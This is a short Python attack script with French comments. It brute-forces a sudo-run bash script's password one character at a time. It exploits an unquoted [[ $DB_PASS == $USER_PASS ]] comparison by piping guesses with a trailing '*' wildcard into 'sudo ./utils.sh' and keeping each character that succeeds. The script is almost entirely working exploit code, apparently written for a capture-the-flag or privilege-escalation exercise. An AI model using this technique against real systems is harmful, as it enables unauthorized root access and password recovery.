#!/usr/bin/env python3
import os

#Script permettant de bruteforce un script protégé par un mot de passe.
#Comparaison type :

#read -S -p "Enter password for root user : " USER_PASS
# if [[ $DB_PASS == $USER_PASS ]]; then
# ...blah

def main():
    restart = True
    last_letter = ""
    print(last_letter)
    while restart:
        try:
            for current_letter in range(48, 122):
                if(current_letter == 58 or current_letter == 59 or current_letter == 60 or current_letter == 61 or current_letter == 62 or current_letter == 63 or current_letter == 64 or current_letter == 91 or current_letter == 92 or current_letter == 93 or current_letter == 94 or current_letter == 95 or current_letter == 96):
                    pass
                else:
                    #changer par sudo ou non et changer l'emplacement du script à bruteforce à la ligne ci-dessous
                    start = os.system(f'echo "k{last_letter}{chr(current_letter)}*" | sudo ./utils.sh >/dev/null 2>&1')
                    if(start == 0):
                        print(f"k{last_letter}{chr(current_letter)}")
                        last_letter += chr(current_letter)
                        restart = True
                    else:
                        restart = True
                        continue
        except KeyboardInterrupt:
            break

main()
